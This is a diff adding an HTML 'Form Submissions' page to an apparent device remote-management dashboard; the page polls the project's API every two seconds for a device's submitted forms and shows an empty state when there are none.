@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Form Submissions</title>
+    <link rel="stylesheet" href="styles.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        .forms-container {
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 70vh;
+            color: #ddd;
+            text-align: center;
+        }
+        .empty-icon {
+            font-size: 20px;
+            margin-right: 8px;
+        }
+        .empty-text-main {
+            font-size: 16px;
+            margin-bottom: 30px;
+            display: flex;
+            align-items: center;
+        }
+        .empty-text-sub {
+            font-size: 15px;
+        }
+    </style>
+</head>
+<body>
+    <header class="main-header device-header">
+        <i class="fa-solid fa-arrow-left back-btn" id="forms-back-btn"></i>
+        <h2>📋 Form Submissions</h2>
+    </header>
+
+    <div class="forms-container" id="forms-content">
+        <!-- Will be populated if any forms exist, otherwise shows empty state -->
+        <div class="empty-state">
+            <div class="empty-text-main">
+                <span class="empty-icon">📭</span> No form submissions found
+            </div>
+            <div class="empty-text-sub">
+                Submit forms from user app first
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const urlParams = new URLSearchParams(window.location.search);
+        const deviceId = urlParams.get('id');
+
+        document.getElementById('forms-back-btn').addEventListener('click', () => {
+            window.location.href = `device.html?id=${deviceId}`;
+        });
+
+        // Use relative path by default to leverage Vercel's rewrite rules
+        let apiBaseUrl = ''; 
+        if (window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1') {
+            apiBaseUrl = 'https://corsproxy.io/?https://v0-remotemanagementsystem-six.vercel.app';
+        }
+
+        async function fetchForms() {
+            if (!deviceId) return;
+            try {
+                // If the API returns a list, we would render them here
+                // For now, based on the screenshot, we just log and leave empty state
+                const res = await fetch(`${apiBaseUrl}/api/device/${deviceId}/forms`);
+                if(res.ok) {
+                    const data = await res.json();
+                    if(data && data.length > 0) {
+                        // Implement form rendering if they start arriving
+                        console.log("Forms received", data);
+                    }
+                }
+            } catch(e) {
+                console.error("Failed to fetch forms", e);
+            }
+        }
+
+        fetchForms();
+        setInterval(fetchForms, 2000);
+    </script>
+</body>
+</html>
